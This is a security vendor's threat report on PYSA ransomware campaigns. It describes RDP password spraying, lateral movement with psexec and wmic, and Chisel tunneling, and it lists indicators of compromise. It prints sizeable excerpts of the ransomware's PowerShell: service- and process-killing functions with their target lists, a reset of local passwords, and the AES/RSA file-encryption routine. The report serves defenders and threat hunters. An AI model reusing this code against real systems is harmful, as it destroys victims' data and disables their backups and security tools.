In March 2021, a](https://www.sentinelone.com/lp/covid-19/) [FBI FLASH alert was issued concerning the](https://www.ic3.gov/Media/News/2021/210316.pdf)\nnoticeable increase in PYSA campaigns, particularly those against healthcare and\neducational targets.\n\nSentinelOne’s DFIR engagement team encountered two particular PYSA ransomware\ncampaigns that displayed some interesting tactics that may be of interest to security teams\nand analysts. In this post, we give a brief overview of PYSA and document the tactics we\nobserved.\n\n\n-----\n\n## Overview\n\nPYSA’s tactics are similar to other ransomware contemporaries. The group embraces the\nmultipronged extortion model, hosting a long-standing blog of victim names and data,\nalthough as of early April 2022, the PYSA victim blog has been offline.\n\n\n-----\n\nScreenshot of PYSA blog\nOnce a target has been breached, the attackers discover and exfiltrate sensitive and critical\ndata, encrypt victim files, and demand a ransom.\n\nPYSA’s primary methods of initial access and delivery have centered around RDP (Remote\nDesktop Protocol) exploits as well as phishing emails. Even with phishing as a first stage, the\ngoal is to extract RDP credentials to make entry via their preferred method.\n\n[The group relies heavily on LOLBINs and COTS tools, avoiding the use of malware other](https://www.sentinelone.com/blog/how-do-attackers-use-lolbins-in-fileless-attacks/)\n[than for encryption. Tools such as Cobalt Strike, Empire, WinSCP,](https://github.com/winscp/winscp) [Advanced IP Scanner and](https://www.advanced-ip-scanner.com/)\n[Advanced Port Scanner (and their forks) are often observed in active PYSA engagements.](https://www.advanced-port-scanner.com/)\nThe group has also adopted additional tools like Chisel. Cloud storage services (e.g.,\n```\nmega.nz ) are often utilized for data exfiltration, detection of which is many victims’ first\n\n```\nindication of infection.\n\nOver the last two years, PYSA has successfully compromised an increasing number of\norganizations. PYSA targets a number of sectors aside from healthcare and education,\nincluding Government, Food & Agriculture, Real Estate, Engineering, Utilities and others.\n\n\n-----\n\n## Technical Details\n\nThe ransomware observed by our team was deployed via a batch script which then called\n\n`psexec.exe to start a` [Windows PowerShell script located at](https://www.sentinelone.com/cybersecurity-101/windows-powershell/)\n```\n“\\\\$<hostname>\\share$\\p.ps1” .\n\n```\nThere were multiple batch scripts in the target directory for multiple deployment methods,\ne.g., `psexec0.bat,` `psexec1.bat,` `wmi0.bat,` `wmi1.bat .`\n\nThe `*0.bat variant calls the PowerShell-based ransomware directly from the network`\nshare; the `*1.bat variant is designed to copy a` `services.exe file from that directory to`\nthe system Temp directory, and `*2.bat file calls that executable on the victim machine.`\nThe latter two files are a backup plan in case the initial PowerShell ransomware is\nunsuccessful; however, due to the lack of the `services.exe file existing in the`\nenvironment, it appears this went unused.\n\nAttackers were seen [password spraying to gain RDP access to both virtual machines and](https://www.sentinelone.com/blog/7-ways-hackers-steal-your-passwords/)\nworkstations. They also targeted domain controllers and exchange servers heavily, planning\nto maximize business disruption.\n\nDuring our investigation of the attack stages, we also identified the attacker using `psexec`\nfor lateral movement and the final ransomware payload encrypted and renamed files with\neither a `.pysa extension or another four character extension.`\n\nThe table below summarizes the different tools and techniques used by the PYSA\nransomware group at different stages of the kill chain.\n\n**TECHNIQUES** **TOOLS**\n\n**Evasion** PowerShell Batch\n\n**Cred Access** PowerShell Empire Koadic Mimikatz\n\n**Discovery** IP Scanner Port Scanner PowerShell\n\n**Persistence** Chisel Cobalt Strike\n\n**Lat Movement** PsExec RDP Batch Script\n\n**Backdoor** Chisel\n\n**Exfiltration** MEGASync WindSCP\n\nBelow are some script files identified on multiple endpoints that attackers used for their\nlateral movement.\n\n**File Name** **Type** **File Size**\n\n\n-----\n\nBefore Windows BatchFile 1 KB\n\np Windows Powershell script 5 KB\n\npsexec0 Windows BatchFile 810 KB\n\npsexec1 Windows BatchFile 736 KB\n\npsexec2 Windows BatchFile 585 KB\n\nwmi2 Windows BatchFile 636 KB\n\nwmi2(1) Windows BatchFile 636 KB\n\n**wmi2 and wmi2 (1) – uses stolen Domain Administrator credentials to deploy the**\nransomware en masse across the environment. In our example, the filename used for the\ndeployed payloads was `svchost.exe .`\n\nThe two `wmi*.bat files dropped by the attacker have numerous lines (like the one below)`\nto laterally move and execute an executable by the name `svchost.exe from the Temp`\nfolder into many different endpoints.\n```\nwmic /node:\"<REDACTED>\" /user:\"<<REDACTED>>\" /password:\"<<REDACTED>>process call\ncreate \"cmd /c c:\\windows\\temp\\svchost.exe\"\n\n```\nThis executable is a Chisel Tunneling tool programmed in Go. Pysa threat actors have been\nconsistent with using Chisel for tunneling, and the same file name and folder path occur in\ntheir earlier attacks as well.\n\nThe scripts above were used for various system information discovery tasks, as well as\nestablishing the Cobalt Strike beacon, and ultimately the PowerShell-based execution of the\nransomware itself.\n\nThe `p.ps1 script above is used to kill or terminate services which may interfere with the`\nencryption process. It also attempts to identify specific anti-virus applications.\n\nThe `s() function will kill services by name, which is passed as an argument to the function.`\nThis is typical pre-ransomware deployment behavior to ensure that handles to critical assets\n(files/DBs) are forcibly closed, allowing the ransomware to obtain a handle and encrypt them.\n```\nfunction s($s) {\nGet-Service | Where-Object {$_.DisplayName -like \"*$s*\"} | Stop-Service -Force\nGet-Service | Where-Object {$_.DisplayName -like \"*$s*\"} | Set-Service -StartupType\nDisabled\n}\n\n```\nServices terminated:\n\n\n-----\n\nSQL Oracle Citrix\n\nExchange Veeam Malwarebytes\n\nSharepoint Quest Backup\n\nThe function `p() is used to terminate processes by name using the WMIC utility. The name`\nof the process to be terminated is passed as an argument to the function. The following\nprocesses are killed by the malware.\n\nacronis adobe agent Agent AlwaysOn\n\nanydesk apache Arcserve autodesk Backup\n\nbarracuda center chrome citrix Citrix\n\nCore.Service database def dev endpoint\n\nEndpoint engine exchange firefox Framework\n\nhttp java logmein Malware manage\n\nmicrosoft Mongo monitor OCS Inventory office\n\nprotect QBCF QBData QBDB QuickBooks\n\nsage secure security segurda server\n\nsilverlight solarwinds sprout sql SQL\n\nteamviewer veeam Veeam vnc web\n```\nfunction p($p) {\n  wmic process where \"name like '%$p%'\" delete\n}\n\n```\nThe script also tags affected systems with a text file, writing the content “I’ll be back”. This\ntext file is written to `C:\\log\\<computer name>.txt .`\n```\nNew-Item -Path \"\\\\<<computer name>>\\log$\" -Name \"$name.txt\" -ItemType \"file\" -Value\n\"I'll be back.\";\n\n```\nFinally, the malware changes the password of all local users to the value of the first 13\ncharacters of the MD5 hash of the username with the string “ololo” appended. For example,\nthe password for the username “admin” will be set to the first 13 characters of the MD5 hash\nof the string “adminololo”.\n\n\n-----\n\n```\nforeach ($user in $localusers)\n{\n  $myUser = \"$($user)ololo\"\n  $hash = Get-StringHash $myUser\n  $pass = $hash.substring(0, 13)\n  ([adsi]\"WinNT://$env:COMPUTERNAME/$user\").SetPassword(\"$pass\");\n}\n\n## Use Of Chisel Tunneling Tool\n\n```\nDuring the course of our investigation, we encountered three different [Chisel samples in](https://github.com/jpillora/chisel)\ntotal, all of which were DLLs, programmed in Go. Chisel is a cross-platform traffic tunneling\ntool, utilized by multiple threat actors. The release version of Chisel consists of a single\nbinary that covers both client and server functionality. The DLLs are wrappers to leverage the\nproject’s client side code. These DLLs function to decrypt the client configuration’s fields (IP,\nport, …), create a new instance of the Chisel client, and then invoke the client.\n\nDigging deeper into the specific Chisel samples, we can see a few things including the\nvarious dependencies.\n\nPackages & Dependencies for Chisel tool\nThe DLL’s original filename was `magic.dll, with the main payload being stored in the`\n“Debug” export.\n\n\n-----\n\nStrings are individually `XOR decrypted at runtime, including the C2 URL. This URL is then`\npassed to the `magicSocks function.`\n\n## Encryption Details (via PowerShell)\n\nBeyond the use of Chisel, there are some interesting highlights within the execution of\nPYSA. The `p.ps1 script is used to prepare the environment, as well as execute the actual`\nransomware with the desired configuration.\n\nThe ransomware enumerates drives to encrypt via `WMI, targeting only “fixed” drives.`\n```\n[array]$target_drives = get-wmiobject win32_volume | ? { $_.DriveType -eq 3 } | % {\nget-psdrive $_.DriveLetter[0] } | % { $_.Root };\n\n```\nA pool of workers is used to speed up the encryption process by running jobs in parallel.\nThese jobs are limited to 20 running at a time.\n```\nwhile ($running_jobs.Count -gt $max_workers)\n{\n  Start-Sleep -Seconds 5;\n  [array]$running_jobs = $worker_jobs | Where { $_.State -eq \"Running\" };\n}\n\n```\nTarget directories are enumerated on each fixed drive, skipping critical folders to avoid\nrendering the victim’s system inoperable. Directories in the root folder of the drive matching\nthe following criteria are skipped (“*” is used as a wildcard):\n\n\n-----\n\nWindows\n*Program Files*\n*ProgramData*\n```\nGet-ChildItem \"$( $disk )*\" -Recurse -Force -Exclude \"*Windows*\", \"*Program Files*\",\n\"*ProgramData*\" | ? { $_.PSIsContainer } | Where-Object { ($_.FullName -notlike\n\"*Windows*\") -and ($_.FullName -notlike \"*Program Files*\") -and ($_.FullName -notlike\n\"*ProgramData*\") } | % { Show(@{ name = $_.FullName; ring = $SKbMxF }) };\n\n```\nThe ransomware includes one exception to the “*Program Files*” directory, targeting folders\nwithin the `“C:\\Program Files\\*SQL*” directory. This is to ensure that SQL databases`\nand other high-value SQL-related files are encrypted.\n```\nGet-ChildItem \"C:\\Program Files*\" -Force -Recurse -Include \"*SQL*\" | Where {\n$_.PSIsContainer } |% { SubSqlItems($_.FullName) };\n\n```\nOnce target folders have been enumerated, they are passed to a worker as a job. Each job\n[executes a ScriptBlock that expects two arguments. The first argument is a base64 string of](https://www.sentinelone.com/blog/guide-encode-decoded-base64/)\ndirectories to encrypt, delimited by a `“|” .`\n```\n$DVXJwpT = $args[0];\n$include_zip = $args[1];\n$JLzbvlx =\n[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($DVXJwpT)\n[array]$target_dirs = $JLzbvlx.split(\"|\");\n\n```\nThe second argument is an option to have the ransomware run in a specific mode to target\nzip files for encryption, which requires the value “1”.\n```\nif ($include_zip -eq 1)\n{\n  [array]$target_files = Get-ChildItem $qlsL -Force -Include \"*.zip\" | Where {\n!$_.PSIsContainer } | Where { $_ };\n}\n\n```\nIf this option is not enabled, then the ransomware will iterate through the target directories\nexcluding the following file extensions from the encryption process.\n\n.ax .dll .exe .inc\n\n.lnk .msi .ps1 .README\n\n.search-ms .sys .tlb .zip\n```\n[array]$target_files = Get-ChildItem $qlsL -Force -Exclude \"*.zip\", \"*.inc\", \"*.ax\",\n\"*.tlb\", \"*.msi\", \"*.lnk\", \"*.dll\", \"*.exe\", \"*.README\", \"*.redacted\", \"*.search-ms\",\n\"*.ps1\", \"*.sys\" | Where { !$_.PSIsContainer } | Where { $_ };\n\n```\n\n-----\n\nOnce this list of files is generated, each file path is passed to the `crypt() function to`\nperform the encryption.\n```\nforeach ($target_file in $target_files_list)\n{\n  crypt($target_file.FullName);\n}\n\n```\nWithin the `crypt() function, a random 32-byte AES key is generated for each individual`\ntarget file. Along with the key, a random 16 byte initialization vector (IV) is generated using\nthe `RNGCryptoServiceProvider class.`\n```\n$rng_crypto_service_provider = New-Object\nSystem.Security.Cryptography.RNGCryptoServiceProvider;\n$aes_key = New-Object byte[] 32;\n$rng_crypto_service_provider.GetBytes($aes_key);\n$init_vec = New-Object byte[] 16;\n$rng_crypto_service_provider.GetBytes($init_vec);\n\n```\nThe AES service provider is then instantiated, setting the key and IV to the randomly\ngenerated values mentioned previously.\n```\n$aes_crypto_service_provider = New-Object\nSystem.Security.Cryptography.AesCryptoServiceProvider;\n$aes_crypto_service_provider.Key = $aes_key;\n$aes_crypto_service_provider.IV = $init_vec;\n$aes_crypto_service_provider.Padding =\n[System.Security.Cryptography.PaddingMode]::Zeros;\n\n```\nThe RSA service provider is then instantiated using a hardcoded RSA XML string.\n```\n$encryptor = $aes_crypto_service_provider.CreateEncryptor();\n$rsa_crypto_service_provider = New-Object\nSystem.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 4096;\n$rsa_crypto_service_provider.PersistKeyInCsp = $false;\n$rsa_crypto_service_provider.FromXmlString($rsa_key_string);\n$rsa_key_string = \"sLdwS+FAAou46fSHkm/5NzsuRy5l5Iqf/+Jy/ZLCbPmrKVvhre0R1no1[...]\"\n\n```\nThe AES key and IV are both then encrypted with the RSA key.\n```\n$qGOTKey = $rsa_crypto_service_provider.Encrypt($aes_key, $false);\n$Dbw = $rsa_crypto_service_provider.Encrypt($init_vec, $false);\n\n```\nThe ransomware then proceeds to encrypt the contents of the file starting at the offset 1671.\n```\n$PBz = 1671;\n[...]\n$file_stream.Seek($PBz, [System.IO.SeekOrigin]::Begin);\n[long]$iGzfUwq = $file_stream.Read($mctMK, 0, $mctMKSize);\n$qGOT = $encryptor.TransformFinalBlock($mctMK, 0, $iGzfUwq);\n$file_stream.Seek($PBz, [System.IO.SeekOrigin]::Begin);\n$file_stream.Write($qGOT, 0, $iGzfUwq);\n\n```\n\n-----\n\nApproximately 10% of each file is encrypted, calculated using the following logic.\n```\n[long]$mctMKSize = $MZKSize / 10;\nif ($mctMKSize -gt 6225920)\n{\n  $mctMKSize = 6225920;\n}\nelse\n{\n  $SZdRf = [math]::floor($mctMKSize / 1024);\n  if ($SZdRf -eq 0)\n  {\n    $SZdRf = 1;\n  }\n  $mctMKSize = 1024 * $SZdRf;\n}\n\n```\nThe encrypted AES key and IV are both written to the end of the newly encrypted file, and\nthe file name is appended with the custom extension chosen by the attacker.\n```\n$file_stream.Seek(0, [System.IO.SeekOrigin]::End);\n$file_stream.Write($qGOTKey, 0, $qGOTKey.Length);\n$file_stream.Write($Dbw, 0, $Dbw.Length);\n$file_stream.Close();\nRename-Item -Path $file_to_encrypt -NewName \"$( $file_to_encrypt ).redacted\";\n\n## Protecting Against PYSA Ransomware\n\n```\nSentinelOne customers are fully-protected against PYSA ransomware.\n\nWatch Video At:\n\nhttps://youtu be/r-vXDDkHOZg\n\n\n-----\n\nWatch Video At:\n\nhttps://youtu.be/GyVhVEhMiJ4\n\n## Conclusion\n\nPYSA has outlasted some of its contemporaries through careful choice of targets as well as\naffiliates. Although the group’s TTPs cannot be described as technically advanced, the use of\nthe Chisel tunneling tool and preparation of the target environment via PowerShell scripts is\nsufficiently novel to be worth documenting. We hope that providing visibility into all the\nvarious steps in the attack chain will be helpful for defenders and threat hunters to identify,\ndetect and prevent such attacks.\n\n## Indicators of Compromise\n\n**SHA1**\n6b6855931e69d27f5f2e2d828fbeb4db91688996\n6aa7b2744a7e3975f0dff3672ec633b687ef5fbd\n598da6d3ac08e21c39807fffabd2f597edb4cbb8\n9200e264a9916534798d79a9aab69359f65e5fc7\n11e399bed1a2e4ac51dfbae16a21f1adaff7c95f\nef14422bf5d013878cd12abf44a7720b92d1750c\n8e6c7618699ac39393aa01fd99848f868c0921f2\n407933cdb8ba12cf61606803be354b87f2674321\nd02608e1771af7c19413ecf504e2df2989f25da3\n69dab8db13bbe0b9ddac7aeeb52fde3928030e43\n44013f5f6f5c88482441f1fa673e1ada7d6e845f\na80b1f9f44156bc876b9f1e641745af1a5a77be2\n\n\n-----\n\nb435fedf7e40e3ef24dba050102d63e2d5aa2e1e\n94a351849632c435f6809eda080f52e6d0ad1195\nf7d7567d1721478eee276001aeeba44473a713ef\n6f5f822260e4deaa859f3f17e81d9349950d9e34\n51cbc9455b7781cf0529f299631e59016fe52e95\n8ec2266a0e4c807973a27bc9cf5b10b4d11f6c5c\n52b2fc13ec0dbf8a0250c066cd3486b635a27827\n425209b891142704462baf14048d0dd59d0c7561\n\n**SHA256**\ne9662b468135f758a9487a1be50159ef57f3050b753de2915763b4ed78839ead\n44f1def68aef34687bfacf3668e56873f9d603fc6741d5da1209cc55bdc6f1f9\n0433efd9ba06378eb6eae864c85aafc8b6de79ef6512345294e9e379cc054c3d\n164cb8e82d7e07cca0409925cadd8be5e3e8e07db88526ff7fe87596c6a6bd07\n7c774062bc55e2d0e869d5d69820aa6e3b759454dbc926475b4db6f7f2b6cb14\n58ebe9b1c926c87dc1e9d924942504a56456007bff8de4932ef18e476da700c2\n6f3cd5f05ab4f404c78bab92f705c91d967b31a9b06017d910af312fa87ae3d6\n1e39243c218056dbe72b6b889f2245b3d0f49f29952950d4b83581263c09c1ae\nfb31b023d2545563862c9c314d91770fcec7bb7a4b13abfdb5244266a67446a3\n153222163442b304f5cee295268115c9cfdf0f1168f49f9e3fae52340eee51ec\nd1b6ee9b716fe48e51ac4e6bec691366bb08d507773d61a5d14fb15ec5e25e2b\n6f4338a7a3ef8e491279ae81543a08554cad15d1bce6007047bc4449d945b799\n051fb654403340420102430f807ea41ab790666488d897dc5b0008e99fed47d6\n75c8e93ffcfd84f0d3444c0b9fc8c9a462f91540c8760025c393a749d198d9db\n7fd3000a3afbf077589c300f90b59864ec1fb716feba8e288ed87291c8fdf7c3\n931772ac59f5859e053589202c8db81edc01911391fe5b32c9abb5bbc2b06e43\naf99b482eb0b3ff976fa719bf0079da15f62a6c203911655ed93e52ae05c4ac8\n90cf35560032c380ddaaa05d9ed6baacbc7526a94a992a07fd02f92f371a8e92\n4770a0447ebc83a36e590da8d01ff4a418d58221c1f44d21f433aaf18fad5a99\ne4287e9708a73ce6a9b7a3e7c72462b01f7cc3c595d972cf2984185ac1a3a4a8\n\n### MITRE ATT&CK\n\n[T1027.002 – Obfuscated Files or Information: Software Packing](https://attack.mitre.org/techniques/T1027/002/)\n\n[T1007 – System Service Discovery](https://attack.mitre.org/techniques/T1007/)\n\n[T1059 – Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)\n\n[TA0010 – Exfiltration](https://attack.mitre.org/tactics/TA0010/)\n\n[T1082 – System Information Discovery](https://attack.mitre.org/techniques/T1082/)\n\n[T1490 – Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)\n\n[T1048.003 – Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated](https://attack.mitre.org/techniques/T1048/003/)\nNon-C2 Protocol\n\n[T1567.002 – Exfiltration Over Web Service: Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002/)\n\n[S0583 – PYSA](https://attack.mitre.org/software/S0583/)\n\n\n-----\n\n[S0154 – Cobalt Strike](https://attack.mitre.org/software/S0154/)\n[T1110 – Brute Force](https://attack.mitre.org/techniques/T1110)\n[T1562 – Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562)\n[T1070.004 – Indicator Removal on Host: File Deletion](https://attack.mitre.org/techniques/T1070/004)\n[T1036 – Masquerading: Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036)\n[T1112 – Modify Registry](https://attack.mitre.org/techniques/T1112)\n[T1046 – Network Service Scanning](https://attack.mitre.org/techniques/T1046)\n[T1003.001 – OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001)\n[T1021.001 – Remote Service: Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)\n[T1489 – Service Stop](https://attack.mitre.org/techniques/T1489)\n[T1016 – System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016)\n[T1569.002 – System Services: Service Execution](https://attack.mitre.org/techniques/T1569/002)\n[T1552.001 – Unsecured Credentials: Credentials in Files](https://attack.mitre.org/techniques/T1552/001)\n\n\n-----",
